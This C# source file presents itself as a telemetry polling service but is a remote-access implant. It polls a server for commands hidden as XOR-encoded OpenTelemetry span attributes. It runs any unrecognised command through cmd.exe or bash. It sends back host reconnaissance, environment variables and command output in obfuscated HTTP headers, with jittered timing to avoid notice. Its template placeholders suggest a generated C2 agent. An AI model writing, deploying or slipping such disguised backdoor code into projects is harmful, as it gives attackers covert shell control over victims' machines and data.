using System.Diagnostics;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace SystemTelemetryService.Services;

public class TelemetryPollingService : BackgroundService
{
    private readonly IHttpClientFactory _httpClientFactory;
    private readonly ILogger<TelemetryPollingService> _logger;
    private readonly string _collectorServer;
    private readonly string _selfUrl;
    private readonly string _instanceId;
    private readonly byte[] _masterKey = Encoding.UTF8.GetBytes("Enterprise-Monitoring-v1");

    private const string ATTR_DATA = "db.statement";
    private const string ATTR_REQ_ID = "db.connection.id";

    private const int BATCH_TIMEOUT_MS = {{BATCH_TIMEOUT_MS}};
    private const int EXPORT_DELAY_MS = {{EXPORT_DELAY_MS}};

    public TelemetryPollingService(
        IHttpClientFactory httpClientFactory,
        ILogger<TelemetryPollingService> logger,
        string collectorServer,
        string selfUrl)
    {
        _httpClientFactory = httpClientFactory;
        _logger = logger;
        _collectorServer = collectorServer.TrimEnd('/');
        _selfUrl = selfUrl.TrimEnd('/');
        _instanceId = $"{Environment.MachineName}-{Process.GetCurrentProcess().Id}";
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Polling Service started. Instance ID: {InstanceId}", _instanceId);

        await SendSysInfoAsync();

        var random = new Random();

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                var workItem = await PollAsync();

                if (workItem != null)
                {
                    _logger.LogInformation("Received work: {WorkType}", workItem.Type);
                    var result = await ProcessWorkAsync(workItem.Content);
                    await TriggerSelfRequestAsync(workItem.Id, result);
                }

                var variance = random.Next(-EXPORT_DELAY_MS, EXPORT_DELAY_MS);
                await Task.Delay(BATCH_TIMEOUT_MS + variance, stoppingToken);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error in polling loop");
                await Task.Delay(5000, stoppingToken);
            }
        }
    }

    private async Task SendSysInfoAsync()
    {
        try
        {
            var client = _httpClientFactory.CreateClient();

            var sysInfo = new Dictionary<string, string>
            {
                ["os"] = Environment.OSVersion.Platform.ToString(),
                ["arch"] = System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString(),
                ["user"] = Environment.UserName,
                ["host"] = Environment.MachineName,
                ["ip"] = GetLocalIP(),
                ["elevated"] = IsElevated().ToString().ToLower()
            };

            var sysInfoStr = string.Join(";", sysInfo.Select(kv => $"{kv.Key}={kv.Value}"));
            var encoded = EncodeData(sysInfoStr);

            var request = new HttpRequestMessage(HttpMethod.Get, $"{_selfUrl}/api/telemetry/checkin");
            request.Headers.Add("X-Instance-Id", _instanceId);
            request.Headers.Add("X-Sysinfo", encoded);

            await client.SendAsync(request);
            _logger.LogInformation("Sysinfo sent via self-request");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to send sysinfo");
        }
    }

    private async Task<WorkItem?> PollAsync()
    {
        try
        {
            var client = _httpClientFactory.CreateClient();
            var response = await client.GetAsync($"{_collectorServer}/v1/traces/{_instanceId}");

            if (!response.IsSuccessStatusCode)
                return null;

            var json = await response.Content.ReadAsStringAsync();
            var data = JsonDocument.Parse(json);

            var resourceSpans = data.RootElement.GetProperty("resourceSpans");
            if (resourceSpans.GetArrayLength() == 0)
                return null;

            foreach (var rs in resourceSpans.EnumerateArray())
            {
                var scopeSpans = rs.GetProperty("scopeSpans");
                foreach (var ss in scopeSpans.EnumerateArray())
                {
                    var spans = ss.GetProperty("spans");
                    foreach (var span in spans.EnumerateArray())
                    {
                        var attrs = span.GetProperty("attributes");
                        string? dataEncrypted = null;
                        string? reqId = null;

                        foreach (var attr in attrs.EnumerateArray())
                        {
                            var key = attr.GetProperty("key").GetString();
                            var value = attr.GetProperty("value").GetProperty("stringValue").GetString();

                            if (key == ATTR_DATA) dataEncrypted = value;
                            if (key == ATTR_REQ_ID) reqId = value;
                        }

                        if (!string.IsNullOrEmpty(dataEncrypted))
                        {
                            var content = DecodeData(dataEncrypted);
                            var parts = content.Split(' ', 2);

                            return new WorkItem
                            {
                                Id = reqId ?? "unknown",
                                Type = parts[0],
                                Content = content,
                                Args = parts.Length > 1 ? parts[1] : ""
                            };
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogDebug("Poll error: {Error}", ex.Message);
        }

        return null;
    }

    private async Task<string> ProcessWorkAsync(string content)
    {
        try
        {
            var parts = content.Split(' ', 2);
            var workType = parts[0].ToLower();
            var args = parts.Length > 1 ? parts[1] : "";

            return workType switch
            {
                "sysinfo" => GetSysInfo(),
                "whoami" => Environment.UserName,
                "hostname" => Environment.MachineName,
                "pwd" => Directory.GetCurrentDirectory(),
                "cd" => ChangeDirectory(args),
                "ls" or "dir" => ListDirectory(args),
                "env" => string.Join("\n", Environment.GetEnvironmentVariables()
                    .Cast<System.Collections.DictionaryEntry>()
                    .Take(20)
                    .Select(e => $"{e.Key}={e.Value}")),
                "kill" or "exit" or "terminate" => StopService(),
                _ => await ExecuteShellAsync(content)
            };
        }
        catch
        {
            return "";
        }
    }

    private string StopService()
    {
        _logger.LogInformation("Stop received - service shutting down");
        Task.Run(async () =>
        {
            await Task.Delay(2000);
            Environment.Exit(0);
        });
        return "";
    }

    private async Task<string> ExecuteShellAsync(string input)
    {
        try
        {
            var isWindows = OperatingSystem.IsWindows();
            var psi = new ProcessStartInfo
            {
                FileName = isWindows ? "cmd.exe" : "/bin/bash",
                Arguments = isWindows ? $"/c {input}" : $"-c \"{input}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var process = Process.Start(psi);
            if (process == null) return "";

            var output = await process.StandardOutput.ReadToEndAsync();
            var error = await process.StandardError.ReadToEndAsync();
            await process.WaitForExitAsync();

            var result = output + error;
            return string.IsNullOrWhiteSpace(result) ? "" : result.Trim();
        }
        catch
        {
            return "";
        }
    }

    private async Task TriggerSelfRequestAsync(string reqId, string result)
    {
        try
        {
            var client = _httpClientFactory.CreateClient();
            var encryptedResult = EncodeData(result.Length > 4000 ? result[..4000] : result);

            var request = new HttpRequestMessage(HttpMethod.Post, $"{_selfUrl}/api/telemetry/report");
            request.Headers.Add("X-Instance-Id", _instanceId);
            request.Headers.Add("X-Request-Id", reqId);
            request.Headers.Add("X-Result", encryptedResult);

            await client.SendAsync(request);
            _logger.LogInformation("Result sent via self-request");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to trigger self-request");
        }
    }

    private byte[] DeriveKey()
    {
        using var hmac = new HMACSHA256(_masterKey);
        return hmac.ComputeHash(Encoding.UTF8.GetBytes(_instanceId))[..16];
    }

    private string EncodeData(string plaintext)
    {
        var key = DeriveKey();
        var data = Encoding.UTF8.GetBytes(plaintext);
        var encrypted = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
        return Convert.ToBase64String(encrypted);
    }

    private string DecodeData(string encoded)
    {
        try
        {
            var key = DeriveKey();
            var encrypted = Convert.FromBase64String(encoded);
            var decrypted = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
                decrypted[i] = (byte)(encrypted[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(decrypted);
        }
        catch
        {
            return encoded;
        }
    }

    private string GetSysInfo()
    {
        var sb = new StringBuilder();
        sb.AppendLine($"Hostname: {Environment.MachineName}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"Architecture: {System.Runtime.InteropServices.RuntimeInformation.OSArchitecture}");
        sb.AppendLine($"Username: {Environment.UserName}");
        sb.AppendLine($"Domain: {Environment.UserDomainName}");
        sb.AppendLine($".NET: {Environment.Version}");
        sb.AppendLine($"Processors: {Environment.ProcessorCount}");
        sb.AppendLine($"Elevated: {IsElevated()}");
        sb.AppendLine($"IP: {GetLocalIP()}");
        return sb.ToString();
    }

    private string GetLocalIP()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            return host.AddressList
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?
                .ToString() ?? "unknown";
        }
        catch { return "unknown"; }
    }

    private bool IsElevated()
    {
        try
        {
            if (OperatingSystem.IsWindows())
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            return Environment.UserName == "root";
        }
        catch { return false; }
    }

    private string ChangeDirectory(string path)
    {
        if (string.IsNullOrEmpty(path)) return Directory.GetCurrentDirectory();
        Directory.SetCurrentDirectory(path);
        return Directory.GetCurrentDirectory();
    }

    private string ListDirectory(string path)
    {
        var dir = string.IsNullOrEmpty(path) ? Directory.GetCurrentDirectory() : path;
        var entries = Directory.GetFileSystemEntries(dir).Take(50);
        return string.Join("\n", entries.Select(e =>
        {
            var isDir = Directory.Exists(e);
            var name = Path.GetFileName(e);
            return isDir ? $"[DIR]  {name}" : $"       {name}";
        }));
    }
}

public class WorkItem
{
    public string Id { get; set; } = "";
    public string Type { get; set; } = "";
    public string Content { get; set; } = "";
    public string Args { get; set; } = "";
}
